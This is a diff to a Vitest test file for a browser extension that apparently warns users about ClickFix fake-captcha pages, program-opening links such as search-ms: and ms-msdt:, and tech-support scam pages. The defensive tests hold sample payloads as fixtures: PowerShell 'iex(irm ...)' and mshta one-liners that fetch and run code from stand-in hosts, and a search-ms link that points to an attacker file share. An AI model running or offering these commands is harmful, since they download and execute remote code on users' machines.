@@ -3,7 +3,8 @@ import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 
 import type { BannerHandle, BannerHandlers, BannerProps } from '@okolos/ui'
 
-import { watchForTraps, type TrapDeps, type TrapWatcher } from './traps.js'
+import { createSurfaceSlot, type SurfaceSlot } from './surface-slot.js'
+import { lentShadowRoot, watchForTraps, type TrapDeps, type TrapWatcher } from './traps.js'
 
 const CLICKFIX_TEXT =
   'Verify you are human: press Win + R, then Ctrl + V, then press Enter.'
@@ -298,6 +299,93 @@ describe('a link that opens a program or a shared folder (B-165)', () => {
     expect(mounts).toHaveLength(0)
   })
 
+  it('leaves a right click alone, which opens a menu and not the link', () => {
+    // Chromium fires auxclick with button 2 after contextmenu; a person copying the
+    // address from the menu met a blocking warning and a false journal line.
+    const { mounts, mountWarning } = mounted()
+    const deps = watch({ mountWarning })
+    const anchor = link('search-ms:query=x')
+    for (const [type, button] of [['auxclick', 2], ['click', 2], ['auxclick', 3], ['auxclick', 4]] as const) {
+      const event = new MouseEvent(type, { bubbles: true, cancelable: true, button })
+      anchor.dispatchEvent(event)
+      expect(event.defaultPrevented, `${type} ${button}`).toBe(false)
+    }
+    expect(mounts).toHaveLength(0)
+    expect(deps.warned).not.toHaveBeenCalled()
+  })
+
+  it('journals a link once per page however often it is clicked', () => {
+    // A page looping element.click() wrote one "What changed" row per click.
+    const { mounts, mountWarning } = mounted()
+    const deps = watch({ mountWarning })
+    const anchor = link('ms-msdt:/id PCWDiagnostic')
+    const prevented: boolean[] = []
+    for (let i = 0; i < 100; i += 1) prevented.push(click(anchor).defaultPrevented)
+
+    expect(prevented.every(Boolean)).toBe(true)
+    expect(deps.warned).toHaveBeenCalledTimes(1)
+    expect(mounts).toHaveLength(1)
+
+    click(link('search-ms:query=x'))
+    expect(deps.warned).toHaveBeenCalledTimes(2)
+  })
+
+  it('finds a link inside an open shadow root, where the click is retargeted to the host', () => {
+    // A listener on the document sees the shadow host as the target; the browser's
+    // composed path still carries the link (measured in Chromium and WebKit).
+    const { mounts, mountWarning } = mounted()
+    watch({ mountWarning })
+    const host = document.createElement('div')
+    document.body.append(host)
+    const root = host.attachShadow({ mode: 'open' })
+    const anchor = document.createElement('a')
+    anchor.setAttribute('href', 'search-ms:query=x')
+    root.append(anchor)
+
+    const event = new MouseEvent('click', { bubbles: true, cancelable: true, composed: true, button: 0 })
+    const path = [anchor, root, host, document.body, document.documentElement, document, window]
+    Object.defineProperty(event, 'composedPath', { value: () => path })
+    host.dispatchEvent(event)
+
+    expect(event.defaultPrevented).toBe(true)
+    expect(mounts).toHaveLength(1)
+  })
+
+  it('finds a link inside a closed shadow root through the root the browser lends an extension', () => {
+    // A closed root hides the link from the composed path as well; the extension
+    // APIs (chrome.dom.openOrClosedShadowRoot, Element.openOrClosedShadowRoot in
+    // Firefox) lend the root, and the link is the one under the pointer or focused.
+    const { mounts, mountWarning } = mounted()
+    const host = document.createElement('div')
+    document.body.append(host)
+    const root = host.attachShadow({ mode: 'closed' })
+    const anchor = document.createElement('a')
+    anchor.setAttribute('href', 'ms-msdt:/id x')
+    root.append(anchor)
+    watch({ mountWarning, shadowRootOf: (element) => (element === host ? root : null) })
+
+    const closedPath = [host, document.body, document.documentElement, document, window]
+    const send = (init: MouseEventInit) => {
+      const event = new MouseEvent('click', { bubbles: true, cancelable: true, composed: true, ...init })
+      Object.defineProperty(event, 'composedPath', { value: () => closedPath })
+      host.dispatchEvent(event)
+      return event
+    }
+
+    // The pointer: what is under it inside the root.
+    Object.defineProperty(root, 'elementFromPoint', {
+      configurable: true,
+      value: (x: number, y: number) => (x === 40 && y === 12 ? anchor : null),
+    })
+    expect(send({ button: 0, clientX: 40, clientY: 12, detail: 1 }).defaultPrevented).toBe(true)
+
+    // The keyboard: Enter on the focused link, which a click with no pointer carries.
+    Object.defineProperty(root, 'elementFromPoint', { configurable: true, value: () => null })
+    anchor.focus()
+    expect(send({ button: 0 }).defaultPrevented).toBe(true)
+    expect(mounts).toHaveLength(1)
+  })
+
   it('stops listening when the watcher stops', () => {
     const { mounts, mountWarning } = mounted()
     watch({ mountWarning })
@@ -305,5 +393,255 @@ describe('a link that opens a program or a shared folder (B-165)', () => {
     watcher = null
     expect(click(link('search-ms:query=x')).defaultPrevented).toBe(false)
     expect(mounts).toHaveLength(0)
+  })
+})
+
+describe('the trap warnings through the real surface slot (B-165, round 1)', () => {
+  /**
+   * The stubbed mount above never went through the slot, which is how "This is wrong"
+   * passed every test while doing nothing in the product: the slot's watch put the
+   * panel straight back.
+   */
+  const realWait = (ms: number) => new Promise<void>((resolve) => setTimeout(resolve, ms))
+  const slots: SurfaceSlot[] = []
+
+  afterEach(() => {
+    for (const slot of slots) slot.release()
+    slots.length = 0
+  })
+
+  function slotted(): SurfaceSlot {
+    const slot = createSurfaceSlot({
+      doc: document,
+      noteRefused: () => undefined,
+      escalate: vi.fn(async () => undefined),
+      alsoLine: (kinds) => `also here: ${kinds.join(', ')}`,
+      wait: realWait,
+    })
+    slots.push(slot)
+    return slot
+  }
+
+  const trapMount = (slot: SurfaceSlot) => slot.mountFor('trap', 'critical')
+  const panels = () => document.querySelectorAll('[data-okolos=banner]').length
+  const shown = (slot: SurfaceSlot) => slot.current()?.root.querySelector('[data-role=headline]')?.textContent ?? null
+  const press = (slot: SurfaceSlot, role: string) =>
+    (slot.current()?.root.querySelector(`[data-role=${role}]`) as HTMLButtonElement | null)?.click()
+
+  function link(href: string): HTMLAnchorElement {
+    const anchor = document.createElement('a')
+    anchor.setAttribute('href', href)
+    anchor.textContent = 'Open the invoice'
+    document.body.append(anchor)
+    return anchor
+  }
+
+  function copyOf(payload: string): Event {
+    const event = new Event('copy', { bubbles: true })
+    Object.defineProperty(event, 'clipboardData', { value: { getData: () => payload } })
+    return event
+  }
+
+  it('"This is wrong" closes the outside-link warning, and it stays closed', async () => {
+    const slot = slotted()
+    watch({ mountWarning: trapMount(slot) })
+    const anchor = link('search-ms:query=x')
+    anchor.click()
+    expect(shown(slot)).toBe('[warnOutsideLinkHeadline]')
+
+    press(slot, 'dispute')
+    await realWait(1000)
+
+    expect(panels()).toBe(0)
+    expect(slot.current()).toBeNull()
+    // That one link now goes through; the person said so.
+    const again = new MouseEvent('click', { bubbles: true, cancelable: true, button: 0 })
+    anchor.dispatchEvent(again)
+    expect(again.defaultPrevented).toBe(false)
+  })
+
+  it('"This is wrong" closes the ClickFix warning, and it stays closed (SCN-008)', async () => {
+    document.body.textContent = CLICKFIX_TEXT
+    const slot = slotted()
+    watch({ mountWarning: trapMount(slot) })
+    document.dispatchEvent(copyOf('powershell -w hidden -c "iex(irm http://x.test/a)"'))
+    await settle()
+    expect(shown(slot)).toBe('[warnClickfixCopied]')
+
+    press(slot, 'dispute')
+    await realWait(1000)
+    expect(panels()).toBe(0)
+    expect(slot.current()).toBeNull()
+  })
+
+  it('"This is wrong" closes the tech-support warning, and it stays closed (SCN-009)', async () => {
+    document.body.textContent = SCARE_TEXT
+    const slot = slotted()
+    const deps = watch({ mountWarning: trapMount(slot) })
+    deps.doc.defaultView?.dispatchEvent(new Event('beforeunload'))
+    await settle()
+    expect(shown(slot)).toBe('[warnTechsupportHeadline]')
+
+    press(slot, 'dispute')
+    await realWait(1000)
+    expect(panels()).toBe(0)
+  })
+
+  it('a fake-captcha page that opens search-ms: and copies a payload ends on the ClickFix warning', async () => {
+    // The FileFix shape: one click both copies the command and opens Explorer. The
+    // link warning goes up first; the ClickFix verdict is the more urgent sentence
+    // and takes the panel, and it is journalled.
+    document.body.textContent = CLICKFIX_TEXT
+    const slot = slotted()
+    const deps = watch({ mountWarning: trapMount(slot) })
+    await settle()
+    const anchor = link('search-ms:query=invoice&crumb=location:%5C%5Cfiles.attacker.test%5Cshare')
+    anchor.addEventListener('click', () => {
+      document.dispatchEvent(copyOf('powershell -w hidden -c "iex(irm http://x.test/a)"'))
+    })
+    // The page text names the pretext from the start, so the medium warning may be up
+    // already; close it the way a person would and click the link.
+    if (slot.current() !== null) press(slot, 'dispute')
+    deps.warned.mockClear()
+    anchor.click()
+    await settle()
+
+    expect(panels()).toBe(1)
+    expect(shown(slot)).toBe('[warnClickfixCopied]')
+    expect(deps.warned).toHaveBeenCalledWith('clickfix', expect.arrayContaining(['copy-not-made-by-you']))
+    expect(deps.warned).toHaveBeenCalledWith('outside-link', ['search-ms', 'opens-a-program'])
+  })
+
+  it('counts a copy the page makes inside a held link click as the page\'s, as a real browser sends it', async () => {
+    // execCommand('copy') in the page's click handler fires a trusted copy event in
+    // Chromium, so the FileFix page ended on the link warning in the e2e walk. The
+    // person clicked a link, not Copy: a copy inside that click is the page's doing.
+    // The event's own data is empty for an execCommand copy, so the warning says it
+    // could not be read rather than showing an empty box.
+    document.body.textContent = CLICKFIX_TEXT
+    const slot = slotted()
+    const deps = watch({ mountWarning: trapMount(slot) })
+    await settle()
+    if (slot.current() !== null) press(slot, 'dispute')
+    deps.warned.mockClear()
+
+    const anchor = link('search-ms:query=x')
+    anchor.addEventListener('click', () => {
+      const trusted = new Event('copy', { bubbles: true })
+      Object.defineProperty(trusted, 'isTrusted', { value: true })
+      Object.defineProperty(trusted, 'clipboardData', { value: { getData: () => '' } })
+      document.dispatchEvent(trusted)
+    })
+    anchor.click()
+    await settle()
+
+    expect(shown(slot)).toBe('[warnClickfixCopied]')
+    expect(slot.current()?.root.querySelector('[data-role=detail]')?.textContent).toContain('[warnClickfixUnreadable]')
+    expect(deps.warned).toHaveBeenCalledWith('clickfix', expect.arrayContaining(['copy-not-made-by-you']))
+  })
+
+  it('still ignores a trusted copy outside a held link click (the person\'s own)', async () => {
+    document.body.textContent = CLICKFIX_TEXT
+    const slot = slotted()
+    const deps = watch({ mountWarning: trapMount(slot) })
+    await settle()
+    if (slot.current() !== null) press(slot, 'dispute')
+    deps.warned.mockClear()
+
+    const trusted = new Event('copy', { bubbles: true })
+    Object.defineProperty(trusted, 'isTrusted', { value: true })
+    document.dispatchEvent(trusted)
+    await settle()
+    expect(deps.warned).not.toHaveBeenCalled()
+  })
+
+  it('a ClickFix copy replaces a standing outside-link warning on an ordinary-looking page', async () => {
+    const slot = slotted()
+    const deps = watch({ mountWarning: trapMount(slot) })
+    link('ms-msdt:/id x').click()
+    expect(shown(slot)).toBe('[warnOutsideLinkHeadline]')
+
+    document.body.append(document.createTextNode(` ${CLICKFIX_TEXT}`))
+    document.dispatchEvent(copyOf('mshta https://x.test/verify.hta'))
+    await settle()
+
+    expect(panels()).toBe(1)
+    expect(shown(slot)).toBe('[warnClickfixCopied]')
+    expect(deps.warned).toHaveBeenCalledWith('clickfix', expect.any(Array))
+  })
+
+  it('never holds another module\'s panel as its own', async () => {
+    // Seam break 4: an injection warning held the slot, the refused claim handed back
+    // its handle, and the watcher kept it as its own. After the person closed that
+    // panel every outside link was stopped with no panel, and ClickFix stayed silent.
+    const slot = slotted()
+    const injection = slot.claim({
+      kind: 'injection',
+      severity: 'critical',
+      props: { variant: 'injection', severity: 'critical', headline: 'injection', detail: '', sourceLine: '' },
+      handlers: { onPrimary: () => {}, onRetry: () => {}, onDispute: () => {}, onDismiss: () => {} },
+    })
+    const deps = watch({ mountWarning: trapMount(slot) })
+    const anchor = link('search-ms:query=x')
+
+    anchor.click()
+    expect(shown(slot)).toBe('injection')
+    expect(slot.waiting()).toEqual(['trap'])
+
+    injection.destroy()
+    await realWait(400)
+    expect(slot.current()).toBeNull()
+
+    const second = new MouseEvent('click', { bubbles: true, cancelable: true, button: 0 })
+    anchor.dispatchEvent(second)
+    expect(second.defaultPrevented).toBe(true)
+    expect(shown(slot)).toBe('[warnOutsideLinkHeadline]')
+
+    document.body.append(document.createTextNode(` ${CLICKFIX_TEXT}`))
+    document.dispatchEvent(copyOf('powershell iex x'))
+    await settle()
+    expect(deps.warned).toHaveBeenCalledWith('clickfix', expect.any(Array))
+    expect(shown(slot)).toBe('[warnClickfixCopied]')
+  })
+
+  it('moves focus to "Leave this page" when the warning opens, and back to the link when it closes', async () => {
+    // A keyboard user pressed Enter on the link and stayed on it, under a full-page
+    // panel: fourteen Tabs through covered page links before the warning's first button.
+    const slot = slotted()
+    watch({ mountWarning: trapMount(slot) })
+    const anchor = link('search-ms:query=x')
+    anchor.focus()
+    anchor.click()
+
+    const root = slot.current()?.root
+    expect(root?.activeElement?.getAttribute('data-role')).toBe('primary')
+
+    press(slot, 'dispute')
+    expect(document.activeElement).toBe(anchor)
+  })
+})
+
+describe('the shadow root an extension may read', () => {
+  afterEach(() => {
+    delete (globalThis as { chrome?: unknown }).chrome
+  })
+
+  it('asks chrome.dom for a closed root where Chromium lends it', () => {
+    const host = document.createElement('div')
+    const root = host.attachShadow({ mode: 'closed' })
+    ;(globalThis as { chrome?: unknown }).chrome = { dom: { openOrClosedShadowRoot: (e: Element) => (e === host ? root : null) } }
+    expect(lentShadowRoot(host)).toBe(root)
+  })
+
+  it('reads Firefox\'s openOrClosedShadowRoot, and an open root anywhere', () => {
+    const closedHost = document.createElement('div')
+    const closed = closedHost.attachShadow({ mode: 'closed' })
+    Object.defineProperty(closedHost, 'openOrClosedShadowRoot', { value: closed })
+    expect(lentShadowRoot(closedHost)).toBe(closed)
+
+    const openHost = document.createElement('div')
+    const open = openHost.attachShadow({ mode: 'open' })
+    expect(lentShadowRoot(openHost)).toBe(open)
+    expect(lentShadowRoot(document.createElement('div'))).toBeNull()
   })
 })
